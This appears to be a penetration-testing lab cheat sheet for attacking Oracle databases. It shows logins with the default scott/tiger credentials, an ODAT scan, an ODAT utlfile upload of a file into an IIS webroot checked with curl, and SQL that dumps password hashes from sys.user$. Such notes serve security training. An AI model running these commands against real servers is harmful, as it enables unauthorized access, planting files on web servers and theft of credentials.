# Oracle Database connect
```
sqlplus scott/tiger@10.129.204.235/XE
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
# ODAT
### Test Oracle Database 
```
sudo odat all -s 10.129.204.235
```
### Upload file to web server path 
```
echo "Oracle File Upload Test" > testing.txt
odat utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```
| Parameter | Description |
|---|---|
| `odat` | Oracle Database Attacking Tool |
| `utlfile` | Uses Oracle's `UTL_FILE` functionality to interact with server-side files |
| `-s 10.129.204.235` | Target Oracle database server IP |
| `-d XE` | Oracle database SID |
| `-U scott` | Database username |
| `-P tiger` | Database password |
| `--sysdba` | Attempts to connect with SYSDBA privileges |
| `--putFile` | Uploads a local file to the database server |
| `C:\\inetpub\\wwwroot` | Destination directory on the Windows server |
| `testing.txt` | Destination filename |
| `./testing.txt` | Local source file |
### command 
select * from user_role_privs;  
select name, password from sys.user$;
